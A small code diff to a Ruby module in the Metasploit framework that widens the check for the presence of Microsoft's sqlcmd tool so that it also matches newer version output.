@@ -99,7 +99,7 @@ module Msf
         # @return [Boolean] true if sqlcmd is present
         def check_sqlcmd
           result = run_cmd('sqlcmd -?')
-          result =~ /SQL Server Command Line Tool/i
+          result =~ /SQL Server Command Line Tool|Version v\d+/i
         end
 
         # Runs a SQL query using the identified command line tool
